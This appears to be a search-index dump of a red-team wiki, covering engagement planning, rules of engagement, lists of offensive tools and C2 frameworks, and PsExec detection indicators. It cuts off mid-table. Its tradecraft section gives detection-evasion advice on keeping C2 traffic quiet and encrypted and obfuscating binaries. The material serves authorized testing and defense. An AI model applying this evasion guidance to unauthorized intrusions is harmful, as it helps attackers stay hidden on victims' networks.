goal oriented process driven by threat tactics. The focus is on training or measuring a blue team's ability to defend against this threat. Defense covers protection, detection, response, and recovery. PDRR</p> <p>Definition: Red Teaming is the process of using Tactics, Techniques, and Procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of the people, processes, and technology used to defend an environment.</p> <p>Red teaming is NOT a hunt for vulnerabilities, flaws, bugs, etc. The goal is to understand security operations as a whole (people, processes, and technology). The result of a red team engagement may identify vulnerabilities, but more importantly, red teaming provides an understanding of blue's capability to impact a threat's ability to operate.</p>"},{"location":"redteaming/redteaming/#why-red-team","title":"Why Red Team?","text":"<ul> <li>Measure the effectiveness of the people, processes, and technology used to defend a network. How do you know if blue TTPs are effective?</li> <li>Train and/or measure Blue Teams ability to impact a threat Blue teams need practice. Better to practice on a helpful threat that a real one</li> <li>Test and understand specific threats or threat scenarios Red team engagements can be designed to exercise custom scenarios. Scenarios can include zero-days, ransom-ware attacks, or other unique attacks.</li> </ul>"},{"location":"redteaming/redteaming/#threat-gets-a-vote","title":"Threat Gets a Vote","text":"<p>Dig deeper in the need for the threat perspective here. Threat Gets a Vote - Applying a Threat-Based Approach to Security Testing</p> <p></p> <p>How often do security defenders ask the bad-guy how or what they will do? Many organization develop security defenses without fully understanding what is important to a threat. Red teaming provides defenders an understanding of how a threat operates in a safe controlled process.</p> <p>Better to learn and practice with a Red Team than a real buy guy... anonymous blue teamer</p>"},{"location":"redteaming/redteaming/#red-teaming-vs-penetration-testing-vs-vulnerability-testing","title":"Red Teaming vs Penetration Testing vs Vulnerability Testing","text":"<p>Follow this link for a comparison of security testing types.</p> <p>http://threatexpress.com/redteaming/red_vs_pen_vs_vuln/</p>"},{"location":"redteaming/resources/","title":"Red Team References","text":""},{"location":"redteaming/resources/#red-team-references_1","title":"Red Team References","text":"<p>External references that contain Red Team related information.</p> Description Link Red Team: How to think like the enemy - Micha Zenko https://www.cfr.org/book/red-team Strategic Cyber Blog http://blog.cobaltstrike.com SpecterOps Blog https://posts.specterops.io ThreatExpress Blog http://threatexpress.com Cobalt Strike Aggressor Scripts @harleyQu1nn https://github.com/harleyQu1nn/AggressorScripts Cobalt Strike Aggressor Scripts @bluescreenofjeff https://github.com/bluscreenofjeff/AggressorScripts Awesome-Red-Teaming https://github.com/yeyintminthuhtut/Awesome-Red-Teaming Red Team Journal http://redteamjournal.com"},{"location":"redteaming/resources/#red-team-infrastructure","title":"Red Team Infrastructure","text":"<p>Tips and tricks on building a Red Team infrastructure.</p> Description Link Red Team Infrastructure Wiki https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki Designing Covert Red Team Infrastructure https://bluescreenofjeff.com/2017-12-05-designing-effective-covert-red-team-attack-infrastructure/ Mod_Rewrite Redirectors https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/ CobaltStrike Profiles to Mod_Rewrite http://threatexpress.com/2018/02/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/ SSL Certificate installation/transparency reports https://cryptoreport.websecurity.symantec.com SSL Certificate installation/transparency reports https://transparencyreport.google.com/https/certificates?hl=en"},{"location":"redteaming/resources/#red-team-tools","title":"Red Team Tools","text":"<p>Highlighted Red Team tools based on the Get In, Stay In, and Act concept and the Cyber Kill Chain</p> <p></p>"},{"location":"redteaming/resources/#get-in","title":"Get In","text":""},{"location":"redteaming/resources/#reconnaissance","title":"Reconnaissance","text":"<p>Tools for information gathering</p> Description Link BloodHound https://github.com/BloodHoundAD/BloodHound DomainHunter https://github.com/threatexpress/domainhunter EyeWitness https://github.com/ChrisTruncer/EyeWitness MailSniper https://github.com/dafthack/MailSniper Nmap https://nmap.org Recon-NG https://bitbucket.org/LaNMaSteR53/recon-ng Shodan https://www.shodan.io/ OPSEC Considerations for Beacon Commands https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/"},{"location":"redteaming/resources/#weaponization","title":"Weaponization","text":"<p>Tools for creating payloads</p> Description Link CACTUSTORCH https://github.com/mdsecactivebreach/CACTUSTORCH Backdoor Factory https://github.com/secretsquirrel/the-backdoor-factory Unicorn https://github.com/trustedsec/unicorn Veil https://github.com/Veil-Framework 10 Process Injection techniques https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"},{"location":"redteaming/resources/#delivery","title":"Delivery","text":"<p>Tools for initial access and payload delivery</p> Description Link Social Engineering Toolkit https://github.com/trustedsec/social-engineer-toolkit GoPhish https://getgophish.com/ FiercePhish https://github.com/Raikia/FiercePhish"},{"location":"redteaming/resources/#exploitation","title":"Exploitation","text":"<p>Tools for exploitation</p> Description Link Burp Suite https://portswigger.net/burp Exploit-DB https://www.exploit-db.com Metasploit https://www.metasploit.com Zed Attack Proxy https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"},{"location":"redteaming/resources/#stay-in","title":"Stay In","text":""},{"location":"redteaming/resources/#installation","title":"Installation","text":"<p>Tools for persistence and payload installation</p> Description Link Windows Privilege Escalation Checklist https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md Persistence https://rastamouse.me/2018/03/a-view-of-persistence/ PowerSploit https://github.com/PowerShellMafia/PowerSploit"},{"location":"redteaming/resources/#command-and-control","title":"Command and Control","text":"<p>Command and Control tools and frameworks</p> Description Link Empire http://www.powershellempire.com/ CobaltStrike https://cobaltstrike.com/ Kodiac https://github.com/zerosum0x0/koadic PoshC2 https://github.com/nettitude/PoshC2 Pupy https://github.com/n1nj4sec/pupy Merlin https://github.com/Ne0nd0g/merlin Metasploit https://www.metasploit.com/ TinyShell https://github.com/threatexpress/tinyshell Throwback https://github.com/silentbreaksec/Throwback WMImplant https://github.com/ChrisTruncer/WMImplant"},{"location":"redteaming/resources/#act","title":"Act","text":""},{"location":"redteaming/resources/#action-on-objectives","title":"Action on Objectives","text":"<p>Tools that perform actions on a target</p> Description Link Misc PowerShell Post Exploitation Scripts https://github.com/rvrsh3ll/Misc-Powershell-Scripts Hashcat https://hashcat.net/hashcat/ GhostPack https://github.com/GhostPack DCOM objects for lateral movement https://www.cybereason.com/blog/dcom-lateral-movement-techniques Mimikatz https://github.com/gentilkiwi/mimikatz PowerUp https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 PowerView https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 WMIOps https://github.com/ChrisTruncer/WMIOps/"},{"location":"redteaming/rolesandrelationships/","title":"Red Team Roles and Relationships","text":"<p>See the Definitions for more information.</p>"},{"location":"redteaming/windowsactivedirectory/","title":"Attacking Windows and Windows Active Directory","text":""},{"location":"redteaming/windowsactivedirectory/#net","title":".NET","text":"Description Link James Forshaw's OleView .NET project https://tyranidslair.blogspot.com/2018/09/finding-interactive-user-com-objects_9.html The DotNetToJScript project to run C# from VBS/JScript https://github.com/tyranid/DotNetToJScript"},{"location":"redteaming/windowsactivedirectory/#windows-active-directory","title":"Windows Active Directory","text":"Description Link Attack and defend active directory using modern post exploitation adversary tradecraft activity https://github.com/infosecn1nja/AD-Attack-Defense Offensive DPAPI Abuse https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse Internal-Monologue - Retrieving NTLM Hashes without Touching LSASS https://github.com/eladshamir/Internal-Monologue Constrained delegation information https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/ Constrained delegation information http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/ Golden Ticket detections https://adsecurity.org/?p=1515](https://adsecurity.org/?p=1515) Golden Ticket detections https://docs.microsoft.com/en-us/azure-advanced-threat-protection/suspicious-activity-guide#kerberos-golden-ticketa-namegolden-ticketa A Guide to Attacking Domain Trusts http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts"},{"location":"redteaming/redteamplanning/goalplanning/","title":"Red Team Goals and Planning","text":""},{"location":"redteaming/redteamplanning/goalplanning/#description","title":"Description","text":"<p>Creating and deciding Red Team engagement goals can be difficult.  This is especially true for organizations new to Red Teaming.  Whether you are on the delivery or receiving end of a Red Team engagement, the solid goals must be decided to have successful Red Team engagement.  This document provides a list of common goals that work well in most Red Team engagements.  They can be used as a starting point for planning.  Modify and customize as needed. Each goal has a list of questions that can be answered as a narrative from the observations and measurements during a Red Team engagement.</p>"},{"location":"redteaming/redteamplanning/goalplanning/#common-goals-measure-and-observe","title":"Common Goals: Measure and observe ...","text":""},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-access-to-common-and-restricted-areas-physical","title":"A threat\u2019s ability to access to common and restricted areas (physical)","text":"<ul> <li>What ability does a threat have to access common areas?</li> <li>What ability does a threat have to access restricted areas?</li> <li>Can a threat use access gained to enable cyber capabilities?</li> <li>What impacts can a threat have through gained access?</li> </ul>"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-access-keycritical-systems","title":"A threat\u2019s ability to access key/critical systems","text":"<ul> <li>Can a threat access key/critical systems?</li> <li>What impacts can a threat have on key/critical systems?</li> </ul>"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-move-freely-throughout-a-network","title":"A threat\u2019s ability to move freely throughout a network","text":"<ul> <li>What ability does a threat have to freely move throughout a network?</li> </ul>"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-gain-domain-wide-and-local-administrative-access","title":"A threat\u2019s ability to gain domain wide and local administrative access?","text":"<ul> <li>What ability does a threat have to gain local administrative access?</li> <li>What ability does a threat have to gain domain administrative access?</li> <li>What ability does a threat have to gain elevated access?</li> </ul>"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-access-or-identify-sensitive-information","title":"A threat\u2019s ability to access or identify sensitive information","text":"<ul> <li>What ability does a threat have to access sensitive information?</li> <li>What ability does a threat have to identify sensitive information?</li> </ul>"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-exfiltrate-data-outside-an-organization","title":"A threat\u2019s ability to exfiltrate data outside an organization","text":"<ul> <li>What ability does a threat have to exfiltrate data outside an organization?</li> <li>How much data must be exfiltrated to impact an organization?</li> </ul>"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-act-undetected-for-a-given-time-frame","title":"A threat\u2019s ability to act undetected for a given time frame","text":"<ul> <li>How long can a threat go undetected?</li> <li>Can a threat achieve its goals undetected?</li> <li>What must a threat do to stimulate a reaction from an organization?</li> </ul>"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-perform-operational-impacts","title":"A threat\u2019s ability to perform operational impacts","text":"<ul> <li>What impacts can a threat perform against an organization?</li> <li>How can a threat affect X?</li> </ul>"},{"location":"redteaming/redteamplanning/redteamchecklist/","title":"Red Team Checklist","text":"<p>This set of checklists is intended to be a start to help plan and build a red team. Each design may have additional requirements. Use this as a starting point and modify as you see fit.</p>"},{"location":"redteaming/redteamplanning/redteamchecklist/#red-team-development-checklist","title":"Red Team Development Checklist","text":"<ul> <li>\u2610 Determine required knowledge and skills<ul> <li>\u2610 Identify and implement alternate methods for bridging knowledge gaps</li> </ul> </li> <li>\u2610 Develop roles and responsibilities guide</li> <li>\u2610 Develop red team methodology</li> <li>\u2610 Develop TTP guidance for engagements<ul> <li>\u2610 Includes Bag of tricks</li> </ul> </li> <li>\u2610 Develop data collection guide and tools</li> <li>\u2610 Develop operational process plan</li> <li>\u2610 Develop communication plan template</li> <li>\u2610 Develop ROE template</li> <li>\u2610 Develop technical briefing template</li> <li>\u2610 Develop report template</li> </ul>"},{"location":"redteaming/redteamplanning/redteamchecklist/#planning-red-team-engagement-checklist","title":"Planning - Red Team Engagement Checklist","text":"<ul> <li>\u2610 Engagement Planning<ul> <li>\u2610 ROE<ul> <li>\u2610 Event Communication plan</li> <li>\u2610 Distribute Deconfliction Process</li> <li>\u2610 Entry point/method</li> <li>\u2610 Scope</li> <li>\u2610 Goals/Objectives (should address at least one of the following)<ul> <li>\u2610 Protect</li> <li>\u2610 Detect</li> <li>\u2610 Respond</li> <li>\u2610 Restore</li> </ul> </li> <li>\u2610 Target Restrictions</li> <li>\u2610 Target Infrastructure / Asset verification / Approvals</li> </ul> </li> <li>\u2610 Scenario Development</li> <li>\u2610 Operational Impact planning</li> </ul> </li> <li>\u2610 Develop threat profiles<ul> <li>\u2610 Network and Host Activity</li> <li>\u2610 IOC Generation (incl subsequent Analysis) and Management</li> </ul> </li> <li>\u2610 Plan threat infrastructure<ul> <li>\u2610 Tier 1</li> <li>\u2610 IPs</li> <li>\u2610 Systems</li> <li>\u2610 Redirectors</li> <li>\u2610 PPS</li> <li>\u2610 Tier 2</li> <li>\u2610 IPs</li> <li>\u2610 Systems</li> <li>\u2610 Redirectors</li> <li>\u2610 PPS</li> <li>\u2610 Tier 3</li> <li>\u2610 IPs</li> <li>\u2610 Systems</li> <li>\u2610 Redirectors</li> <li>\u2610 PPS</li> <li>\u2610 Deploy tools to infrastructure</li> </ul> </li> <li>\u2610 Data collection repository</li> </ul>"},{"location":"redteaming/redteamplanning/redteamchecklist/#execution-red-team-engagement-checklist","title":"Execution - Red Team Engagement Checklist","text":"<ul> <li>\u2610 Daily completion and roll-up confirmation<ul> <li>\u2610 Capture logs</li> <li>\u2610 Capture screenshots</li> <li>\u2610 Capture system changes</li> </ul> </li> <li>\u2610 Daily (or twice daily) mandatory internal RT SITREP</li> <li>\u2610 Update real-time attack diagram</li> </ul>"},{"location":"redteaming/redteamplanning/redteamchecklist/#culmination-red-team-engagement-checklist","title":"Culmination - Red Team Engagement Checklist","text":"<ul> <li>\u2610 Engagement Closeout<ul> <li>\u2610 Roll up data</li> <li>\u2610 Roll back system changes</li> <li>\u2610 Validate data has been collected</li> <li>\u2610 Outline critical attack diagram</li> <li>\u2610 Technical Review (tech-on-tech)</li> <li>\u2610 Executive Brief</li> </ul> </li> <li>\u2610 Reporting<ul> <li>\u2610 Draft attack narrative</li> <li>\u2610 Draft observation and findings</li> <li>\u2610 Finalize attack diagram</li> <li>\u2610 Finalize report</li> </ul> </li> </ul>"},{"location":"redteaming/redteamplanning/roeguide/","title":"ROE","text":""},{"location":"redteaming/redteamplanning/roeguide/#rules-of-engagement-roe-guidance","title":"Rules of Engagement (ROE) Guidance","text":"<p>The Rules of Engagement establish the responsibility, relationship, and guidelines between the Red Team, the network owner, the system owner, and any stakeholders required for engagement execution.</p> <p>This document governs the entire process of a Red Team and must be adhered to during the execution of an engagement. Deviation from the rules established in the ROE must be approved by all parties prior to execution.</p> <p>The ROE document covers numerous topics. Some include:</p> <ul> <li>Authorized Actions</li> <li>Explicitly Restricted Actions</li> <li>Authorized Targets and Target Space</li> <li>Restricted Items (Blacklist)</li> <li>Engagement Objectives</li> </ul> <p>ROE Document The ROE documents the target information, approvals, threat implementation, activities, and issues required to staff, coordinate, and execute engagements within the target environment. </p> <p>The main body of the ROE (often derived from a standing template) provides information on:</p> <ul> <li>The Red Team methodology</li> <li>A high-level description of the types of activities that may be executed</li> <li>The types of hardware and software that may be employed</li> <li>A recommended deconfliction process</li> <li>Levels of threat available (comparison)</li> <li>Roles and responsibilities of each functional group (Exercise Control Group (ECG), White Cell, Training Audience (TA), etc.)</li> <li>The identification of and references to appropriate legal requirements (PCI, FERPA, HIPAA, HITEC, SOX, GLBA, etc.)</li> <li>A legal responsibility disclaimer (federally mandated requirements for the Red Team to report certain findings)</li> </ul> <p>Information specific to each individual engagement should be documented in annexes to the ROE. At a minimum, ROE annexes should detail:</p> <ul> <li> <p>The Target of the Engagement</p> <ul> <li>Organization name</li> <li>Address</li> <li>Specific groups or divisions</li> <li>Organizational identifiers</li> <li>Senior management contact info</li> </ul> </li> <li> <p>An Engagement Contact List (name, role, phone, email, office location)</p> <ul> <li>ECG personnel</li> <li>White Cell</li> <li>Trusted Agents</li> <li>Red Team Lead</li> <li>Red Tech Lead</li> </ul> </li> <li> <p>Engagement Objectives</p> <ul> <li>Conditions</li> <li>Threat level</li> <li>Targeted objectives</li> <li>Targets of opportunity</li> <li>Measures of success/failure</li> </ul> </li> <li> <p>Authorized Target Space</p> <ul> <li>Network<ul> <li>The IP boundaries of the event</li> <li>Domains and/or workgroups</li> <li>Specific off-limits areas and resources (non-target intellectual property file share)</li> <li>Off-limits machines, networks, equipment, or applications (blacklist)</li> <li>Maintenance windows</li> </ul> </li> <li>Physical<ul> <li>Areas of the campus</li> <li>Buildings</li> <li>Offices</li> <li>Off-limits areas (e.g., the emergency services sector of a medical complex)</li> <li>Off-limits materials within the target space (e.g., sensitive documents or equipment)</li> </ul> </li> </ul> </li> <li>Authorized Actions: Types of activities approved for the engagement</li> <li>Restricted Actions: Types of activities restricted during the engagement (if any)</li> <li>The process for requesting approval of additional activities during engagement execution<ul> <li>Approval process</li> <li>Points of contact (name, role, phone, email, office location)</li> <li>Alternate POC</li> </ul> </li> </ul> <p>The ROE must be updated when the target space, authorized actions, objectives, or scope are changed. For instance, the original scope may be limited to computer network attacks. If physical attacks are planned, the ROE must be updated to reflect the additional activities and controls. The Red Team Lead will address suggestions or adjustments to the ROE. Each review result must be provided to the originator. The final ROE must be approved by a Trusted Agent in senior management of the target environment.</p>"},{"location":"redteaming/redteamplanning/tradecraft/","title":"Red Team Tradecraft and TTP Guidance","text":"<p>This template should be used to define the overall guidance on Red Team Tradecraft and TTPs. Every Red Team should have a guidance document. Keep this document updated and distributed to all Red Team members. This document should be used to guide Red Team actions of all Red Team operators on all engagements. Exceptions to these rules can (and will) be made based on specific Rules of Engagement (ROE) or decision made by Red Team leads during an engagement. Exceptions should be documented as part of the engagement logging. It is important to use and follow this document to maintain a high-quality professional Red Team.</p> <p>Add custom or specific Tradecraft and TTP Guidance to this document as needed. This include specific or customs tools that should be used for various tasks, C2, enumeration, etc</p> <p>Guidance</p> Do Don't Log all significant events Use untested tools on a target system Consult with peers Use unencrypted channels for C2 Understand tools and technology used Attempt to exploit or attack unencrypted websites Perform situational awareness Execute from non-executable locations Minimize callback (C2) volume Download restricted datasets Use binaries for initial access"},{"location":"redteaming/redteamplanning/tradecraft/#do-log-all-significant-actions","title":"DO: LOG ALL SIGNIFICANT ACTIONS","text":"<p>(SUCCESSES AND FAILURES) Log, log and log some more! Screenshot all significant actions including successful and failed attempts. One of the most important aspects of the Red Team engagement is the collection of data (a.k.a. logs). It is common that an inexperienced team completes an engagement with subpar documentation. Many actions are not fully captured, some actions are never captured, and often key failures are ignored. Each action performed provides value to the target as well as the target defenders. Incomplete logs prevent the Red Team from providing a complete and accurate depiction of the actions, obstacles, and defensive strengths and weaknesses of the target (i.e. mission failure). There are several methods to ensure logs are appropriately captured and stored: - Automated logging of the terminal: All terminal actions logged, timestamped and stored to a predefined location. - Tool logs: Most commercial tools have some capability to log actions and produce a raw and/or final report. - Custom tools logs: If you write a custom tool/script, it should output a log of actions and results. - Operator logs: By far this is the most important log. A log may show the action performed and the result; however, only the operator can accurately note the way the action was performed, what lead them to the decision, and their interpretation of the result. - Screenshots: Terminal logs are great for the operator and even better as supporting artifacts; however, they may mean nothing to senior level executives (and even some IT professionals). Screenshots before, during, and following the execution of an action hold much more weight than a terminal log, tool log, or operator log (often if may just be a screenshot of the terminal during execution).</p>"},{"location":"redteaming/redteamplanning/tradecraft/#do-consult-with-peers","title":"DO: CONSULT WITH PEERS","text":"<p>No matter how long you have been performing IT or security, consult your peers before taking action. This is especially true during exploitation and command and control setup. Simple mistakes often lead to Red Team discovery too early in the engagement. Look at the command below. The command will be run as part of a tool written to provide general SA on a Linux system. What should the output look like?</p> <pre><code>netstat \u2013antb\n</code></pre> <p>The command above is a netstat command that can be executed on a Windows host. Linux does not have the \"b\" option and produces an \"invalid option\" response. Think about it</p> <ul> <li>Have you ever typed ifconfig instead of ipconfig? </li> <li>Have you ever typed rm * in the wrong directory?</li> <li>Have you ever entered credentials only to discover they were \"fat fingered\" (after access error)? While these are oversimplifications, they represent the need for peer review on tools, C2, setup, execution, and even clean up.</li> </ul>"},{"location":"redteaming/redteamplanning/tradecraft/#do-understand-the-tools-and-technologies-used","title":"DO: UNDERSTAND THE TOOLS AND TECHNOLOGIES USED","text":"<p>Understand the underlying technology of a tool or technique before using it on an event. Know how the tool or technique interacts with a target, what network traffic it may generate, and what traces it may leave behind. Knowing what a tool does is only one-third of the equation. What does that mean exactly? Let\u2019s quickly look at a few questions and an example.</p> <ul> <li>What artifacts does the tool leave behind? - Are any files modified during execution?</li> <li>Are there tales in the network traffic?</li> </ul> <p>Now let\u2019s look at psexec (a commonly used tool, but not a recommended tool for Red Teaming a remote system) Depending on how psexec is executed it:</p> <ul> <li>Copies a service file to the remote system</li> <li>Enters a service key into the registry</li> <li>Creates a prefetch file</li> <li>Creates an entry in the Application Compatibility Cache - Creates a login event</li> <li>Creates a profile folder for the remote user</li> <li>Attempts to remove service file and key when exiting (not always successful)</li> </ul> <p>What happens when using the \u2013e option? \u2013s option? How does this differ from psexec for PowerShell? Psexec is not a bad tool, and Red Team operators will use it. But... it is important to understand the IOCs generated by a tool. Getting caught due to a lack of tool understanding is not something any Red Team operators wants to experience.</p>"},{"location":"redteaming/redteamplanning/tradecraft/#do-perform-situational-awareness","title":"DO: PERFORM SITUATIONAL AWARENESS","text":"<p>After gaining access to a remote system perform situational awareness before moving on.</p> <ul> <li>Understand the environment you are in (Is the target in scope?)</li> <li>What protections exist on the system or network?</li> <li>What are the risks of being caught and what attack paths does the system provide? - Are there pre-established connections to other network resources?</li> <li>Who is into the system?</li> <li>Who has recently logged into the system?</li> </ul>"},{"location":"redteaming/redteamplanning/tradecraft/#do-minimize-callback-c2-volume","title":"DO: MINIMIZE CALLBACK (C2) VOLUME","text":"<p>Unless a Host Based protection mechanism is triggered, it is more likely to be discovered or caught by a defenders recognition and/or analysis of traffic on the network. To avoid early detection, it is always good tradecraft to limit the amount of traffic generated during the engagement. There are several general concepts that, if followed, increase the success of the engagement while decreasing the chances of being discovered:</p> <ul> <li>Keep traffic internal to a network: One of the most common issues, and one you should always attempt to change, are the limited number of sensors inside a network. Most network protections are currently applied at the boundary.</li> <li>Pivot command and control traffic to a minimal number of outbound sources: Maintain at least two outbound sources for C2 redundancy; however, only use one for operations (considered an interactive tier). The second (a long or short haul tier) is dormant or extremely slow to be used as a backup if/when the primary is discovered.</li> </ul>"},{"location":"redteaming/redteamplanning/tradecraft/#dont-use-untested-tools-on-a-target-system","title":"DON\u2019T: USE UNTESTED TOOLS ON A TARGET SYSTEM","text":"<p>Before using a new tool (script, application, binary, process, etc.) on a target system, it must be tested, undergo an internal vetting process and be added to an official toolset. Does the tool have negative impacts on specific versions of an OS?</p> <ul> <li>Works fine on Windows 7 but causes system error in Windows 8?</li> <li>Do you know if/what additional actions the tool performs?</li> <li>Tool creates a covert channel for use inside the network.</li> <li>This tool creates a private tunnel between host on a virtual interface; however, this creates a network conflict</li> <li>Ex: target net: 10.10.2.0/24, covert channel net: 10.10.2.0/24 - Hint: Don\u2019t use these! Does the tool try to call home for updates?</li> <li>At start or during a specific operation, the tool tries to poll home for updates</li> <li>This can trigger defensive alerts identifying unauthorized persons or software on the network</li> </ul> <p>Does the tool attempt to run as a specific user or, worse, create a user/group? Keep these questions in mind before executing untested or unknown tools.</p>"},{"location":"redteaming/redteamplanning/tradecraft/#dont-use-unencrypted-channels-for-c2","title":"DON\u2019T: USE UNENCRYPTED CHANNELS FOR C2","text":"<p>Command and control data exiting the network must be encrypted. Clear text data, such as uploading a binary, issuing an operating system command or using a web shell will be detected by an IDS or other network defense if in clear text. It has become common for IPS/IDS to detect specific strings discovered in clear text traffic. For example: \"C:\\Windows\\System32\" has become a common trigger for investigation. Some defenders have even gone the extra mile in legitimizing a potential threat. Assume the defender uses a remote administration tool on a regular basis. Ignoring recommendation, this traffic is unencrypted. Rather than alert each time the tool is used legitimately, the alert is configured to look for inconsistencies in the text. For example: most attackers are accustomed to typing lowercase commands in windows. The defender ignores \"C:\\Windows\\System32\" but alerts on \"c:\\windows\\system32\" Encryption of internal C2 traffic depends upon several different factors:</p> <ul> <li>Are there sensors inside the network?</li> <li>Are there other encrypted communications occurring between target systems?</li> <li>Would encrypted traffic stand-out more than unencrypted traffic? Internal encryption is another example of where peers should be consulted to determine the best course of action before deploying C2 further into a network.</li> </ul>"},{"location":"redteaming/redteamplanning/tradecraft/#dont-attempt-to-exploit-or-attack-unencrypted-websites","title":"DON\u2019T: ATTEMPT TO EXPLOIT OR ATTACK UNENCRYPTED WEBSITES","text":"<p>As tempting as it may be, do not attack unencrypted websites. Simple attacks can trigger IDS. Always know your target IP space. There are likely several websites available for review. Proper reconnaissance and/or coordination should have discovered each. Create a list of sites in your target log. Include IP, URLs, an educated guess at the function, ports, protocols, etc.</p> <p>Important Note! Prior to performing any exploitation and attacks against a web server, refer to your rules of engagement and fully understand:</p> <ul> <li>Who actually owns the website?</li> <li>Who owns the system where the website is hosted? Who owns the backend application?</li> <li>Have proper approvals been obtained to test?</li> </ul>"},{"location":"redteaming/redteamplanning/tradecraft/#dont-execute-from-non-executable-locations","title":"DON\u2019T: EXECUTE FROM NON-EXECUTABLE LOCATIONS","text":"<p>Execution on a Windows environment must occur in a location typical of windows. Executable locations such as c:\\programdata, c:\\progam files, c:\\windows are common. Execution for locations such as c:\\windows\\temp should never occur.</p>"},{"location":"redteaming/redteamplanning/tradecraft/#dont-use-binaries-for-initial-capabilities","title":"DON\u2019T: USE BINARIES FOR INITIAL CAPABILITIES","text":"<p>As a general rule, do not drop binaries on the system. Use built-in commands, such as PowerShell, to achieve your goals first. This is not always possible and binaries may be required; however, binaries must be vetted, obfuscated and tested against detection before use. Ensure all other \"Do\u2019s and Don\u2019ts\" are met for all binaries. Consult a senior operator before dropping any binary.</p>"},{"location":"redteaming/redteamplanning/tradecraft/#dont-download-restricted-datasets","title":"DON\u2019T: DOWNLOAD RESTRICTED DATASETS","text":"<p>NEVER download (or remove from the target network) any PII, HIPPA, PCI, or other restricted datasets. A good rule of thumb is to annotate the type of data, location, access method, and level of access of restricted data in the log. Ensure the log notes include a reference to the type of data discovered for quick reference. Take a screenshot of the displayed filename and location (assuming the file name has no restricted data included). If the operator can screenshot a portion of the dataset without capturing the restricted data, they may do so for proof-of-access; however, DO NOT take screenshots of the data itself!</p>"},{"location":"redteaming/tool_ioc/psexec/","title":"PsExec.exe IOCs and Detection","text":"<p>PsExec.exe is a tool commonly used by system administrators, penetration testers, and threat actors. It is important to understand what indicators a tool may leave behind before using on a Red Team engagement.</p> <p>This document highlights key IOCs generated when the SysInternals version of PsExec SysInternals PsExecis used. This is just only procedure of a larger set of techiques. Most variations of this technique share similar IOCs.</p>"},{"location":"redteaming/tool_ioc/psexec/#mitre-ttp","title":"MITRE TTP","text":"<p>MITRE Technique T1035</p> MITRE TTP Tatic Execution Technique Service Execution Procedure Use PsExec.exe to execute commands on a remote Windows system"},{"location":"redteaming/tool_ioc/psexec/#category","title":"Category","text":"<p>Command Execution</p>"},{"location":"redteaming/tool_ioc/psexec/#description","title":"Description","text":"<p>Executes a command on a remote host.</p>"},{"location":"redteaming/tool_ioc/psexec/#example-of-presumed-tool-use-during-an-attack","title":"Example of Presumed Tool Use During an Attack","text":"<p>The tool is used to execute a remote command on hosts and servers in a domain.</p>"},{"location":"redteaming/tool_ioc/psexec/#tool-operation-overview","title":"Tool Operation Overview","text":"Item Description OS Windows Belongs to Domain Not required Rights Standard User / Administrator Communication Protocol - 88/tcp (when executing in a domain environment) - 135/tcp - 445/tcp - Random High Port"},{"location":"redteaming/tool_ioc/psexec/#information-acquired-from-log","title":"Information Acquired from Log","text":"<p>Standard Settings</p> Source host - A registry value created when the PsExec License Agreement has been agreed to (registry). - Execution history (Prefetch) Destination Host - The fact that the PSEXESVC service has been installed, started, and ended is recorded (system log). - Execution history (Prefetch) <p>Additional Settings</p> Source host - The fact that the PsExec process was executed and that connection was made to the destination via the network, as well as the command name and argument for a remotely executed command are recorded (audit policy, Sysmon). Destination Host - The fact that PSEXESVC.exe was created and accessed, and that connection was made from the source via the network, as well as the command name and argument for a remotely executed command are recorded (audit policy, Sysmon). Packet Capture - Transmission of PSEXESVC and its output file (-stdin, -stdout, -stderr) with SMB2."},{"location":"redteaming/tool_ioc/psexec/#evidence-that-can-be-confirmed-when-execution-is-successful","title":"Evidence That Can Be Confirmed When Execution is Successful","text":"Source Host The Event ID 4689 (A process has exited) indicating that psexec.exe was executed and has exited, was recorded in the event log \"Security\" with the execution result (return value) of \"0x0\". Destination host In the Event ID: 7045 of the event log \"System\", the fact that the PSEXESVC service was installed is recorded."},{"location":"redteaming/tool_ioc/psexec/#main-information-recorded-at-execution","title":"Main Information Recorded at Execution","text":""},{"location":"redteaming/tool_ioc/psexec/#source-host","title":"Source Host","text":"<p>Event Log</p> Log Event ID Task Category Event Details Microsoft-Windows-Sysmon/Operational 1 Process Create (rule: ProcessCreate) Process Create. CommandLine:__ Command line of the execution command ([Path to Executable File] [Execution Command]) UtcTime:__ Process execution date and time (UTC) ProcessGuid/ProcessId: Process ID Image: Path to the executable file (path to the executable file) User: Execute as user Microsoft-Windows-Sysmon/Operationa 3 Network connection detected (rule: NetworkConnect) Network Connection Detected: Protocol: Protocol (tcp) Image: Path to the executable file (System) ProcessGuid/ProcessId: Process ID (4) User: Execute as user (NT_AUTHORITY\\SYSTEM) SourceIp/SourceHostname/SourcePort: Source IP address/Host name/Port number (source host) DestinationIp/DestinationHostname/DestinationPort: Destination IP address/Host name/Port number (destination ports: 135 and 445, high port) Microsoft-Windows-Sysmon/Operationa 13 Registry value set (rule: RegistryEvent) Registry value set. Image: Path to the executable file (path to the tool) ProcessGuid/ProcessId: Process ID Details: Setting value written to the registry (DWORD: 0x00000001) TargetObject: Registry value at the write destination (\\REGISTRY\\USER[User 